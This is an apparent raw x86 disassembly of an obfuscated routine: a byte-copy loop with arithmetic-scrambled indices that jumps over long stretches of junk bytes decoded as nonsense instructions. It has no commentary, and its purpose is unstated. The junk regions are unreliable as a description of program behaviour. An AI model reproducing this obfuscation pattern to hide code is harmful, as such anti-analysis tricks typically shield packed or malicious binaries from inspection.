  411c4d:	mov    DWORD PTR [ebp-0x28],0x2979
  411c54:	mov    DWORD PTR [ebp-0x14],0x9e8
  411c5b:	mov    DWORD PTR [ebp-0x10],0x40e5
  411c62:	mov    ecx,DWORD PTR [ebp-0x4]
  411c65:	mov    eax,DWORD PTR [ebp-0x8]
  411c68:	add    ecx,0x1d04
  411c6e:	xor    ecx,eax
  411c70:	mov    eax,DWORD PTR [ebp-0xc]
  411c73:	and    ecx,0x6f79
  411c79:	imul   ecx,eax
  411c7c:	xor    ecx,0xe33ab1
  411c82:	push   esi
  411c83:	mov    DWORD PTR [ebp-0x4],0x5989
  411c8a:	mov    DWORD PTR [ebp-0x8],0x402c1
  411c91:	mov    DWORD PTR [ebp-0xc],0x4114
  411c98:	mov    eax,DWORD PTR [ebp-0xc]
  411c9b:	mov    esi,DWORD PTR [ebp-0x8]
  411c9e:	xor    edx,edx
  411ca0:	sub    eax,0x6cb6
  411ca5:	div    esi
  411ca7:	mov    edx,DWORD PTR [ebp-0x4]
  411caa:	mov    esi,DWORD PTR [ebp+0xc]
  411cad:	or     eax,edx
  411caf:	xor    eax,0x67f1
  411cb4:	mov    edx,ecx
  411cb6:	sub    edx,eax
  411cb8:	mov    DWORD PTR [ebp-0x4],edx
  411cbb:	mov    eax,DWORD PTR [ebp-0x4]
  411cbe:	mov    edx,DWORD PTR [ebp-0x4]
  411cc1:	mov    dl,BYTE PTR [edx+esi*1]
  411cc4:	mov    esi,DWORD PTR [ebp+0x8]
  411cc7:	mov    BYTE PTR [eax+esi*1],dl
  411cca:	mov    eax,DWORD PTR [ebp-0x10]
  411ccd:	mov    edx,DWORD PTR [ebp-0x14]
  411cd0:	jmp    0x411fd9
  411cd5:	xchg   esi,eax
  411cd6:	mov    dh,0x33
  411cd8:	push   edx
  411cd9:	xor    ebx,DWORD PTR [eax+edi*4-0x46]
  411cdd:	push   eax
  411cde:	ret    0x923c
  411ce1:	mov    cl,0x48
  411ce3:	mov    ss,WORD PTR [eax-0x41419f74]
  411ce9:	mov    es,edx
  411ceb:	mov    esi,0x8d147be
  411cf0:	ret    0x2d95
  411cf3:	inc    esp
  411cf4:	cmp    al,0xb1
  411cf6:	or     dh,ah
  411cf8:	add    ah,dl
  411cfa:	jno    0x411ce9
  411cfc:	pop    eax
  411cfd:	mov    ebp,0xf558c54
  411d02:	mov    ds:0xea56897d,eax
  411d07:	cld    
  411d08:	and    eax,0x7bb2e950
  411d0d:	or     al,0xd0
  411d0f:	es push eax
  411d11:	push   ecx
  411d12:	shr    DWORD PTR [edx],cl
  411d14:	cmp    ecx,DWORD PTR [ebp+0x2d]
  411d17:	xor    eax,0x76e79465
  411d1c:	das    
  411d1d:	cmp    BYTE PTR [eax+0x17922292],cl
  411d23:	in     al,dx
  411d24:	sub    ch,0x70
  411d27:	sbb    BYTE PTR [ebp+0x53],cl
  411d2a:	or     BYTE PTR [ebp+0x79],dl
  411d2d:	lods   eax,DWORD PTR ds:[esi]
  411d2e:	mov    ebp,0x32794713
  411d33:	or     al,0xa2
  411d35:	cld    
  411d36:	scas   eax,DWORD PTR es:[edi]
  411d37:	cmp    DWORD PTR [edx+ebx*1],edx
  411d3a:	add    eax,0xb8a8acff
  411d3f:	push   0x19
  411d41:	adc    BYTE PTR [eax+0x6ba819a6],ah
  411d47:	(bad)  
  411d48:	hlt    
  411d49:	stos   BYTE PTR es:[edi],al
  411d4a:	add    eax,0x1189fbb0
  411d4f:	jne    0x411dc7
  411d51:	or     BYTE PTR [ecx],dh
  411d53:	repnz test DWORD PTR [edi],esp
  411d56:	dec    ebx
  411d57:	and    bl,BYTE PTR cs:[ecx+edi*8]
  411d5b:	lahf   
  411d5c:	jle    0x411dcd
  411d5e:	cmp    ebx,ebp
  411d60:	mov    dl,0x1c
  411d62:	pop    ss
  411d63:	jle    0x411ce9
  411d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d66:	or     DWORD PTR [ebx-0x1571e230],ebx
  411d6c:	fldcw  WORD PTR [eax-0x16ef5fcd]
  411d72:	mov    cl,0x8b
  411d74:	jl     0x411d17
  411d76:	xchg   ebp,eax
  411d77:	jge    0x411d78
  411d79:	inc    esi
  411d7a:	ins    DWORD PTR es:[edi],dx
  411d7b:	inc    ecx
  411d7c:	ss mov esi,0x656965bd
  411d82:	fdiv   DWORD PTR [edx-0x39]
  411d85:	sbb    ah,ch
  411d87:	mov    al,ds:0xf1dc2c8e
  411d8c:	pop    ebx
  411d8d:	pushf  
  411d8e:	aaa    
  411d8f:	loop   0x411d4f
  411d91:	pushf  
  411d92:	cld    
  411d93:	das    
  411d94:	pushf  
  411d95:	daa    
  411d96:	mov    fs,WORD PTR [ebp+0xb]
  411d99:	imul   esp,DWORD PTR [ebp+0x5e],0xbe2de7e1
  411da0:	push   ds
  411da1:	into   
  411da2:	les    bx,DWORD PTR [eax+esi*1+0x5e2fe4b9]
  411daa:	pop    ecx
  411dab:	int3   
  411dac:	sub    BYTE PTR [eax+0x37dc80a4],ch
  411db2:	or     edi,DWORD PTR [edx+0x2733e3a]
  411db8:	imul   ebp,ebp,0xffffffa1
  411dbb:	pushf  
  411dbc:	jecxz  0x411dde
  411dbe:	sti    
  411dbf:	cld    
  411dc0:	lods   eax,DWORD PTR ds:[esi]
  411dc1:	jae    0x411e14
  411dc3:	push   ebx
  411dc4:	fcomip st,st(4)
  411dc6:	repnz and eax,0x7a047eef
  411dcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dcd:	mov    BYTE PTR [edx+edi*4-0x62],dl
  411dd1:	add    eax,0x41397f9
  411dd6:	or     edx,edx
  411dd8:	test   DWORD PTR [esi+0x77],edx
  411ddb:	push   cs
  411ddc:	call   0xe3a635b9
  411de1:	cmc    
  411de2:	cwde   
  411de3:	sar    DWORD PTR [edx-0x72],0x2f
  411de7:	fwait
  411de8:	mov    ds:0x85290f64,al
  411ded:	lea    ebp,[edi+0x753f8975]
  411df3:	dec    esp
  411df4:	(bad)  gs:[ebx-0x15]
  411df8:	stc    
  411df9:	xchg   BYTE PTR [eax+edx*4],bl
  411dfc:	fbstp  TBYTE PTR [esi-0x754a1e4b]
  411e02:	mov    ds:0x7e1c4130,eax
  411e07:	stos   DWORD PTR es:[edi],eax
  411e08:	test   eax,0x3a100c70
  411e0d:	sbb    ebp,DWORD PTR [edi+0x6bb13502]
  411e13:	je     0x8205c4a6
  411e19:	and    DWORD PTR [edx+0x1a],ebp
  411e1c:	mov    ch,0xc0
  411e1e:	es pop edi
  411e20:	fisub  WORD PTR [ecx+0xc6b8a1c]
  411e26:	push   ecx
  411e27:	ds adc eax,0x1a66ef54
  411e2d:	jmp    0xa347:0x98fc5d0a
  411e34:	fstp   QWORD PTR [eax+ecx*4+0x7bf4cda]
  411e3b:	imul   esi,DWORD PTR [ecx],0x3b
  411e3e:	inc    eax
  411e3f:	fisubr WORD PTR [ebx+0x1d]
  411e42:	loope  0x411e33
  411e44:	cmp    al,0x71
  411e46:	(bad)  
  411e47:	push   eax
  411e48:	mov    esi,0xc7787137
  411e4d:	sbb    DWORD PTR [esi-0x18],ebx
  411e50:	scas   al,BYTE PTR es:[edi]
  411e51:	inc    ecx
  411e52:	adc    eax,0x61a623d8
  411e57:	mov    ecx,0xfeb6142c
  411e5c:	push   cx
  411e5e:	sub    al,0xe9
  411e60:	test   DWORD PTR [ebp+0x18],esi
  411e63:	ret    
  411e64:	xchg   ecx,eax
  411e65:	mov    al,ds:0x9a50dd3
  411e6a:	xor    ecx,DWORD PTR [eax-0x32be6588]
  411e70:	mov    edx,0x2fe8fb5b
  411e75:	push   ecx
  411e76:	mov    ebp,0x1a5f5d51
  411e7b:	cs test eax,0x25f93d61
  411e81:	bound  esp,QWORD PTR [ecx]
  411e83:	adc    al,0x33
  411e85:	or     al,BYTE PTR [esi]
  411e87:	test   DWORD PTR [ebp+0x3a],ecx
  411e8a:	jp     0x411e39
  411e8c:	cmp    BYTE PTR [ebx],dh
  411e8e:	imul   ebp,DWORD PTR [ecx+ebx*8-0x39],0xffffff9f
  411e93:	clc    
  411e94:	retf   0x8f05
  411e97:	addr16 pop ebp
  411e99:	retf   
  411e9a:	pop    ecx
  411e9b:	stos   BYTE PTR es:[edi],al
  411e9c:	std    
  411e9d:	sub    eax,0xb1be3cea
  411ea2:	mov    bl,0x35
  411ea4:	mov    ah,0x59
  411ea6:	pop    ss
  411ea7:	push   es
  411ea8:	cmp    eax,0x9a27d967
  411ead:	xchg   edx,eax
  411eae:	in     al,0xf7
  411eb0:	in     eax,0x3b
  411eb2:	or     eax,0x49a80700
  411eb7:	fnclex 
  411eb9:	mov    ds:0xb711f56d,al
  411ebe:	rcr    ecx,1
  411ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ec1:	je     0x411f0c
  411ec3:	test   DWORD PTR [ebx+0x13e81c71],ebp
  411ec9:	or     BYTE PTR ds:0x5bba6256,al
  411ecf:	in     eax,dx
  411ed0:	test   BYTE PTR [edi-0x56ec134d],dh
  411ed6:	outs   dx,BYTE PTR ds:[esi]
  411ed7:	inc    ecx
  411ed8:	mov    al,ds:0x14a9461f
  411edd:	mov    ebp,0x8cf1457b
  411ee2:	lds    edi,FWORD PTR [esi+0x16]
  411ee5:	or     BYTE PTR [ecx],cl
  411ee7:	pop    eax
  411ee8:	stos   DWORD PTR es:[edi],eax
  411ee9:	mov    eax,ds:0x34742731
  411eee:	stos   DWORD PTR es:[edi],eax
  411eef:	mov    ch,ah
  411ef1:	inc    ecx
  411ef2:	stc    
  411ef3:	inc    edi
  411ef4:	push   cs
  411ef5:	js     0x411f0a
  411ef7:	lds    esi,FWORD PTR [edx+eiz*1]
  411efa:	mov    eax,0xb27aea17
  411eff:	jmp    0xf3ebced8
  411f04:	adc    bh,BYTE PTR [ebp+0x1ffdac46]
  411f0a:	sub    eax,0xfd9ff07b
  411f0f:	in     eax,dx
  411f10:	lahf   
  411f11:	mov    cl,0x41
  411f13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f14:	or     esi,esp
  411f16:	adc    ecx,ecx
  411f18:	je     0x411efb
  411f1a:	adc    ch,bl
  411f1c:	out    0x63,eax
  411f1e:	jne    0x411ef1
  411f20:	cs call 0x7b437ae5
  411f26:	or     esp,DWORD PTR [ebx-0x25]
  411f29:	xchg   ebx,eax
  411f2a:	mov    eax,ds:0x8de40dd3
  411f2f:	push   ecx
  411f30:	idiv   ebp
  411f32:	inc    ebp
  411f33:	je     0x411ebf
  411f35:	icebp  
  411f36:	retf   
  411f37:	push   0x1e7fff34
  411f3c:	(bad)  
  411f3d:	out    dx,al
  411f3e:	shl    DWORD PTR [ebp+eax*8+0x2f],1
  411f42:	adc    ah,bh
  411f44:	sub    DWORD PTR [edi],ebx
  411f46:	call   0x85cb:0x2b4e0701
  411f4d:	loop   0x411f30
  411f4f:	xor    eax,esi
  411f51:	pop    esi
  411f52:	scas   al,BYTE PTR es:[edi]
  411f53:	push   edx
  411f54:	and    al,0x24
  411f56:	pop    ecx
  411f57:	xor    al,BYTE PTR [eax-0x23e91ba1]
  411f5d:	pop    ebx
  411f5e:	add    eax,0xf9056e3c
  411f63:	aad    0x86
  411f65:	dec    edx
  411f66:	inc    ebx
  411f67:	inc    esi
  411f68:	mov    eax,0x6ef09bc1
  411f6d:	loop   0x411f9f
  411f6f:	pop    es
  411f70:	daa    
  411f71:	lds    ebx,FWORD PTR [edx+0x6cc43265]
  411f77:	xor    BYTE PTR [ecx+0x3a9c044],ch
  411f7d:	test   al,0x89
  411f7f:	pop    es
  411f80:	and    edx,DWORD PTR [ebx-0x5f2f18d9]
  411f86:	ds jmp 0x305ec006
  411f8c:	je     0x411fdc
  411f8e:	add    dh,BYTE PTR gs:[ebp-0x1a]
  411f92:	add    DWORD PTR [ebx+0x288b9b1f],ebp
  411f98:	scas   al,BYTE PTR es:[di]
  411f9a:	add    al,0x9d
  411f9c:	jnp    0x411fee
  411f9e:	inc    esp
  411f9f:	aam    0x57
  411fa1:	jmp    0x411ff5
  411fa3:	loopne 0x411fe6
  411fa5:	inc    edx
  411fa6:	imul   ebx,DWORD PTR [eax+0x7d28186e],0xffffffee
  411fad:	sub    esp,esp
  411faf:	jle    0x411f61
  411fb1:	adc    ebp,DWORD PTR [ebx]
  411fb3:	fisttp DWORD PTR [edi+ecx*8]
  411fb6:	mov    gs,WORD PTR [edi]
  411fb8:	xchg   ebp,eax
  411fb9:	add    DWORD PTR [edx+0x6d01f521],0x3a1871ba
  411fc3:	nop
  411fc4:	sti    
  411fc5:	mov    ebx,0x5709344a
  411fca:	cmp    bl,bl
  411fcc:	fdivr  DWORD PTR [edx-0x18]
  411fcf:	pushf  
  411fd0:	and    ecx,0x99a8d1
  411fd6:	test   DWORD PTR [esi-0x16],ebp
  411fd9:	imul   eax,eax,0x43bd290
  411fdf:	and    eax,edx
  411fe1:	or     eax,0x1a40
  411fe6:	xor    eax,0x1ac1
  411feb:	add    ecx,eax
  411fed:	mov    eax,DWORD PTR [ebp-0x18]
  411ff0:	mov    edx,0x7380
  411ff5:	sub    edx,eax
  411ff7:	add    edx,DWORD PTR [ebp-0x1c]
  411ffa:	mov    eax,DWORD PTR [ebp-0x20]
  411ffd:	xor    edx,eax
  411fff:	mov    eax,DWORD PTR [ebp-0x24]
  412002:	and    edx,eax
  412004:	mov    eax,DWORD PTR [ebp+0x10]
  412007:	jmp    0x412310
  41200c:	icebp  
  41200d:	or     DWORD PTR [ebp+0x7c3cad28],0xcf30669c
  412017:	nop
  412018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412019:	dec    ecx
  41201a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41201b:	jecxz  0x412079
  41201d:	mov    si,0x8ebe
  412021:	ret    0xbebe
  412024:	mov    ch,0xc9
  412026:	ins    BYTE PTR es:[edi],dx
  412027:	xchg   edx,eax
  412028:	pop    edi
  412029:	dec    eax
  41202a:	adc    ch,BYTE PTR [esp+ebx*1+0x5b]
  41202e:	dec    esi
  41202f:	xor    cl,BYTE PTR [edx]
  412031:	jb     0x41206a
  412033:	lock fnstenv ds:0x7ab4b5dc
  41203a:	mov    eax,0xa56c3cc0
  41203f:	xor    al,0x6b
  412041:	adc    DWORD PTR [ecx],esi
  412043:	cld    
  412044:	xor    BYTE PTR [eax],bl
  412046:	fs dec esp
  412048:	das    
  412049:	and    DWORD PTR [ecx+0x13],0xfb9e8e38
  412050:	jno    0x411ffc
  412052:	add    BYTE PTR [esi+ebx*1-0x29],ah
  412056:	(bad)  
  412057:	xor    ah,al
  412059:	mov    ah,0xe1
  41205b:	imul   esi,esp,0x726d8003
  412061:	sahf   
  412062:	rcr    esp,1
  412064:	push   cs
  412065:	or     ah,cl
  412067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412068:	push   eax
  412069:	xchg   ebp,eax
  41206a:	sar    DWORD PTR [esi+0x63],0xfb
  41206e:	pop    esp
  41206f:	xchg   DWORD PTR [ebp+0x123f609],ebx
  412075:	loope  0x4120bd
  412077:	mov    cl,0x82
  412079:	int3   
  41207a:	pusha  
  41207b:	push   esp
  41207c:	mov    ch,BYTE PTR [ebp+0x2e]
  41207f:	fcom   QWORD PTR [edx+edi*1+0x6c1bdf86]
  412086:	arpl   WORD PTR [ebx],cx
  412088:	enter  0xb225,0x91
  41208c:	ss inc edx
  41208e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41208f:	push   es
  412090:	sti    
  412091:	inc    eax
  412092:	shl    BYTE PTR [edi-0x76],1
  412095:	mov    eax,0xab65c78
  41209a:	sbb    bl,BYTE PTR ds:0xfa08bd47
  4120a0:	in     eax,0x9d
  4120a2:	adc    BYTE PTR [ebp-0xc],ch
  4120a5:	stc    
  4120a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120a7:	and    DWORD PTR [eax-0x20],esi
  4120aa:	inc    eax
  4120ab:	xor    eax,0xa9c5fd88
  4120b0:	outs   dx,DWORD PTR ds:[esi]
  4120b1:	mov    eax,ds:0x86206b64
  4120b6:	in     al,0xf1
  4120b8:	neg    DWORD PTR [ebx+esi*1+0x219703f5]
  4120bf:	inc    esi
  4120c0:	popa   
  4120c1:	(bad)  
  4120c2:	aas    
  4120c3:	mov    eax,0x64940b63
  4120c8:	fnstenv [ebx-0x3e6ceb42]
  4120ce:	inc    edi
  4120cf:	adc    bh,BYTE PTR [esi]
  4120d1:	sbb    DWORD PTR [ebx-0x65],eax
  4120d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120d5:	dec    ecx
  4120d6:	shr    ebx,0x26
  4120d9:	adc    eax,0x127efa23
  4120de:	inc    ecx
  4120df:	adc    ch,bh
  4120e1:	scas   al,BYTE PTR es:[edi]
  4120e2:	dec    ecx
  4120e3:	cmp    eax,0x29e2377
  4120e8:	outs   dx,DWORD PTR ds:[esi]
  4120e9:	mov    gs:0xf466744a,al
  4120ef:	push   esp
  4120f0:	jl     0x4120fb
  4120f2:	mov    cl,al
  4120f4:	jp     0x4120c1
  4120f6:	xor    al,BYTE PTR [eax+eiz*4-0x4b]
  4120fa:	push   0xcac1631e
  4120ff:	push   esp
  412100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412101:	es stos DWORD PTR es:[edi],eax
  412103:	adc    al,0x81
  412105:	dec    ebx
  412106:	jp     0x4120bd
  412108:	les    ebp,FWORD PTR [esi]
  41210a:	sahf   
  41210b:	xor    eax,0xfcff75de
  412110:	push   ebp
  412111:	leave  
  412112:	push   edi
  412113:	shl    BYTE PTR [ebx-0x70],cl
  412116:	and    dl,BYTE PTR [ecx+0x59]
  412119:	sbb    cl,BYTE PTR [ecx+ebx*4+0x41]
  41211d:	test   dl,ah
  41211f:	in     eax,dx
  412120:	xchg   ebx,esp
  412122:	nop
  412123:	rol    BYTE PTR [eax+0x4ba99fd9],1
  412129:	arpl   WORD PTR [eax+0x2e377578],cx
  41212f:	cmc    
  412130:	mov    ebx,0x394ecc3f
  412135:	fld    DWORD PTR ds:0x52bb5faa
  41213b:	mov    ebp,0x17c39a08
  412140:	pop    ecx
  412141:	sub    al,0xfc
  412143:	js     0x412101
  412145:	sbb    eax,0xcdc16199
  41214a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41214b:	pop    ecx
  41214c:	pop    ds
  41214d:	jp     0x41211a
  41214f:	lahf   
  412150:	push   ds
  412151:	fbstp  TBYTE PTR [esi]
  412153:	dec    esi
  412154:	cli    
  412155:	fdiv   st(4),st
  412157:	add    ebx,DWORD PTR [edi]
  412159:	mov    eax,0xef8c2422
  41215e:	jecxz  0x4120f1
  412160:	xchg   eax,edi
  412162:	cdq    
  412163:	xor    DWORD PTR ds:[esp+ebp*8+0x6d7166b9],esi
  41216b:	lahf   
  41216c:	ficom  WORD PTR [edi+eiz*8+0x2d]
  412170:	ins    BYTE PTR es:[edi],dx
  412171:	pop    ebp
  412172:	mov    eax,?
  412174:	std    
  412175:	test   esp,ebp
  412177:	cmp    edx,DWORD PTR [edx]
  412179:	inc    edx
  41217a:	and    BYTE PTR [edx-0x2e],0x44
  41217e:	cmp    DWORD PTR [ecx],esi
  412180:	and    dl,bl
  412182:	push   0xf5da3521
  412187:	inc    BYTE PTR [edx-0x44907b2c]
  41218d:	iret   
  41218e:	adc    al,0x1d
  412190:	fcomp  QWORD PTR [edx]
  412192:	pop    ebx
  412193:	cmp    edi,DWORD PTR [bp-0x7fd6]
  412198:	adc    al,0x31
  41219a:	jmp    0x986a:0x4f211f4e
  4121a1:	dec    esi
  4121a2:	inc    edx
  4121a3:	test   BYTE PTR [ecx],cl
  4121a5:	ret    0x18d4
  4121a8:	xor    ecx,DWORD PTR [ecx]
  4121aa:	dec    edi
  4121ab:	inc    edx
  4121ac:	repz lea ebx,[edx+esi*2-0xa]
  4121b1:	call   0x1c9e4701
  4121b6:	push   ss
  4121b7:	leave  
  4121b8:	punpcklbw mm7,DWORD PTR [edi-0x57]
  4121bc:	sbb    BYTE PTR [edi-0x5414c48f],al
  4121c2:	jno    0x412229
  4121c4:	jo     0x412173
  4121c6:	dec    ebp
  4121c7:	dec    esi
  4121c8:	pop    eax
  4121c9:	jns    0x41219f
  4121cb:	enter  0x85ad,0x5f
  4121cf:	push   esi
  4121d0:	adc    edi,edi
  4121d2:	fs loop 0x41222d
  4121d5:	test   eax,0x5729d8ff
  4121da:	dec    eax
  4121db:	dec    ecx
  4121dc:	stos   BYTE PTR es:[edi],al
  4121dd:	sbb    ebp,edi
  4121df:	pushf  
  4121e0:	js     0x41217c
  4121e2:	loope  0x41216b
  4121e4:	adc    al,0xf0
  4121e6:	rcr    DWORD PTR [ecx-0x78e242d5],1
  4121ec:	mov    cl,0x48
  4121ee:	std    
  4121ef:	in     eax,dx
  4121f0:	popf   
  4121f1:	in     eax,0x90
  4121f3:	inc    ecx
  4121f4:	test   eax,0xed4ad53f
  4121f9:	movq   QWORD PTR [eax-0x3d],mm4
  4121fd:	nop
  4121fe:	bound  ebp,QWORD PTR [ecx-0x604b09c2]
  412204:	push   eax
  412205:	mov    ecx,es
  412207:	and    eax,0x7e001ddf
  41220c:	jp     0x4121a6
  41220e:	fimul  DWORD PTR [ebx]
  412210:	pop    ds
  412211:	jbe    0x412274
  412213:	xchg   ebx,eax
  412214:	inc    ebp
  412215:	in     eax,0xd2
  412217:	and    BYTE PTR [ecx],0x63
  41221a:	retf   
  41221b:	jl     0x4121a7
  41221d:	loopne 0x4121a4
  41221f:	sbb    bh,BYTE PTR [ecx-0x629bf0b9]
  412225:	adc    eax,0xeb02cb2c
  41222a:	adc    eax,0x846fd4e5
  41222f:	mov    eax,0xe3102369
  412234:	xchg   esp,eax
  412235:	xchg   edi,eax
  412236:	sub    eax,0x1f05d0c1
  41223b:	push   ebp
  41223c:	mov    al,0xcf
  41223e:	adc    al,0xdd
  412240:	xchg   edx,eax
  412241:	dec    ebx
  412242:	sahf   
  412243:	mov    DWORD PTR [edi],esi
  412245:	inc    esi
  412246:	mov    ds:0x5af0a22,al
  41224b:	xor    al,0x50
  41224d:	js     0x412219
  41224f:	push   es
  412250:	les    esp,FWORD PTR [eax]
  412252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412253:	les    eax,FWORD PTR [ebp+0x27add1d6]
  412259:	mov    BYTE PTR [ebx+0xf],ch
  41225c:	add    ch,BYTE PTR [esi+ecx*1-0x6a68f546]
  412263:	mov    DWORD PTR [edx-0x7910e3a0],ebp
  412269:	les    ecx,FWORD PTR [edi+0x5c]
  41226c:	loopne 0x41223c
  41226e:	adc    ch,bl
  412270:	adc    al,0x11
  412272:	popa   
  412273:	adc    bh,ch
  412275:	dec    eax
  412276:	mov    bh,dh
  412278:	call   0x2c50add6
  41227d:	push   cs
  41227e:	(bad)
  412281:	mov    cl,0xc5
  412283:	popa   
  412284:	outs   dx,BYTE PTR ds:[esi]
  412285:	cs mov cl,0x1b
  412288:	sbb    al,0x12
  41228a:	adc    edx,DWORD PTR [edi]
  41228c:	sub    al,0xfb
  41228e:	mov    al,ds:0xac939ab0
  412293:	mov    DWORD PTR [eax-0x74],edi
  412296:	int3   
  412297:	ins    DWORD PTR es:[edi],dx
  412298:	stos   DWORD PTR es:[edi],eax
  412299:	aas    
  41229a:	mov    ds:0x504f5107,al
  41229f:	retf   0x3eb9
  4122a2:	aam    0x15
  4122a4:	and    dh,BYTE PTR [edx+0x70584d4f]
  4122aa:	ret    
  4122ab:	jle    0x412270
  4122ad:	jmp    0x41230f
  4122af:	fbld   TBYTE PTR [esi+0x5b088fd8]
  4122b5:	cmp    al,0xea
  4122b7:	mov    bl,0xc6
  4122b9:	ror    DWORD PTR [ecx+0x71e3be47],cl
  4122bf:	pop    esi
  4122c0:	stos   DWORD PTR es:[edi],eax
  4122c1:	es inc ebx
  4122c3:	sbb    DWORD PTR ds:0x677ca537,esp
  4122c9:	and    BYTE PTR ds:0x7831a441,dl
  4122cf:	clc    
  4122d0:	ret    0x9c47
  4122d3:	pop    ecx
  4122d4:	sbb    bh,BYTE PTR [ecx+0x67]
  4122d7:	ja     0x41227f
  4122d9:	fist   WORD PTR [eax+0x73268183]
  4122df:	sbb    DWORD PTR [edx-0x30],0x2f6a1a76
  4122e6:	mov    edi,0x5891143b
  4122eb:	dec    BYTE PTR [edx+ecx*2+0x1c305b43]
  4122f2:	retf   
  4122f3:	ins    BYTE PTR es:[edi],dx
  4122f4:	stos   BYTE PTR es:[edi],al
  4122f5:	adc    al,0x9f
  4122f7:	sar    DWORD PTR [esi+0x4b6a24b2],1
  4122fd:	lea    edx,[esi]
  4122ff:	pushf  
  412300:	jno    0x4122de
  412302:	and    DWORD PTR [ebp+0x26],ebx
  412305:	scas   al,BYTE PTR es:[edi]
  412306:	mov    gs,edi
  412308:	inc    eax
  412309:	loope  0x412291
  41230b:	jne    0x412351
  41230d:	sbb    bl,al
  41230f:	cs xor edx,0x7015
  412316:	sub    eax,edx
  412318:	mov    edx,DWORD PTR [ebp-0x28]
  41231b:	mov    esi,DWORD PTR [ebp-0x2c]
  41231e:	and    edx,0x2a7b
  412324:	lea    edx,[edx+esi*1-0x3571]
  41232b:	mov    esi,DWORD PTR [ebp-0x30]
  41232e:	shr    edx,1
  412330:	or     edx,esi
  412332:	mov    esi,ecx
  412334:	sub    esi,edx
  412336:	add    esi,0x4751
  41233c:	cmp    esi,eax
  41233e:	jbe    0x411c83
  412344:	pop    esi
  412345:	leave  
  412346:	ret    0xc
  412349:	push   ebp
  41234a:	mov    ebp,esp
  41234c:	sub    esp,0x80
  412352:	push   ebx
  412353:	jmp    0x41268c
  412358:	push   0xffffffd2
  41235a:	jnp    0x4122dc
  41235c:	jl     0x412306
  41235e:	mov    edx,0xa0fab73b
  412363:	nop
  412364:	jecxz  0x412313
  412366:	mov    dh,0xa4
  412368:	sub    al,0x6c
  41236a:	mov    esi,0xbec4edbe
  41236f:	mov    esi,0x91acb780
  412374:	(bad)  
  412376:	jne    0x4123a1
  412378:	dec    ebx
  412379:	popa   
  41237a:	push   ss
  41237b:	ins    BYTE PTR es:[edi],dx
  41237c:	push   esi
  41237d:	shl    BYTE PTR [edx+0x47e53581],1
  412383:	test   ax,0x5727
  412387:	jbe    0x412339
  412389:	xchg   BYTE PTR [ebx+0x5c27fd7b],ch
  41238f:	data16 add bh,BYTE PTR [eax-0x59]
  412393:	cmp    BYTE PTR [esi],dl
  412395:	leave  
  412396:	loopne 0x41233e
  412398:	ss call 0xf85e8d0c
  41239e:	lds    edx,FWORD PTR [ecx]
  4123a0:	push   ebp
  4123a1:	mov    DWORD PTR [ebp+0x24406f97],ecx
  4123a7:	into   
  4123a8:	cmc    
  4123a9:	ds mov esp,ebx
  4123ac:	mov    ecx,0x9ae67157
  4123b1:	and    dh,ch
  4123b3:	mov    WORD PTR [ecx],es
  4123b5:	std    
  4123b6:	jl     0x41240e
  4123b8:	add    eax,0x107bbafd
  4123bd:	cmp    edi,DWORD PTR [ecx-0x79]
  4123c0:	push   edi
  4123c1:	fist   DWORD PTR [edi]
  4123c3:	retf   0xef68
  4123c6:	jmp    0x412429
  4123c8:	jbe    0x4123c5
  4123ca:	push   0xffffffc9
  4123cc:	mov    esp,0x8993e95c
  4123d1:	(bad)  
  4123d2:	test   ebp,0xc2ba10c7
  4123d8:	mov    cl,0xdd
  4123da:	mov    esi,0x486a6358
  4123df:	xor    eax,0x6992d247
  4123e4:	xchg   esp,eax
  4123e5:	sub    bh,ah
  4123e7:	sti    
  4123e8:	mov    bl,0xca
  4123ea:	jb     0x41243a
  4123ec:	(bad)  
  4123ed:	call   0xc85d5925
  4123f2:	fcomp  QWORD PTR [esi+0x11]
  4123f5:	sbb    bl,BYTE PTR [edi+0x7c]
  4123f8:	adc    bl,dh
  4123fa:	sub    eax,0x8720b9ca
  4123ff:	mov    eax,0x39d103ac
  412404:	aaa    
  412405:	cld    
  412406:	mov    esp,0x507f24f2
  41240b:	mov    edi,DWORD PTR [esp+eax*1-0x4b]
  41240f:	outs   dx,BYTE PTR ds:[esi]
  412410:	mov    ebp,0xd978965c
  412415:	push   ebx
  412416:	pushw  ss
  412418:	dec    edx
  412419:	mov    ah,0x34
  41241b:	fdivr  DWORD PTR [esp+edx*1-0x4f1aacd1]
  412422:	pop    esp
  412423:	fidiv  WORD PTR [ebp-0x75]
  412426:	adc    esi,ecx
  412428:	daa    
  412429:	loopne 0x41244c
  41242b:	cmp    DWORD PTR [ecx],edi
  41242d:	pop    ecx
  41242e:	repnz (bad) 
  412430:	fcom   QWORD PTR [esi]
  412432:	setae  ah
  412435:	push   ebx
  412436:	arpl   WORD PTR [edx],ax
  412438:	mov    ecx,0x6f42cd13
  41243d:	xchg   edx,eax
  41243e:	inc    eax
  41243f:	std    
  412440:	repnz cwde 
  412442:	pop    ebp
  412443:	shr    ebp,cl
  412445:	jmp    0xc81:0x30651029
  41244c:	add    BYTE PTR [ecx],bh
  41244e:	(bad)  
  41244f:	xor    edi,esi
  412451:	pusha  
  412452:	sbb    BYTE PTR [ebx],ah
  412454:	sub    ah,BYTE PTR [ebp+0x69]
  412457:	sub    DWORD PTR [edi+0x38f4bdba],eax
  41245d:	fucomi st,st(3)
  41245f:	xchg   DWORD PTR [ebx-0x66],eax
  412462:	fild   QWORD PTR fs:[edi+edx*1-0x45a3ab82]
  41246a:	push   edi
  41246b:	inc    eax
  41246c:	(bad)  
  41246d:	std    
  41246e:	sbb    BYTE PTR [eax-0x31183ff4],ah
  412474:	sar    DWORD PTR [esi],1
  412476:	adc    eax,DWORD PTR [ebx-0x704ef688]
  41247c:	jp     0x41249d
  41247e:	in     eax,0x21
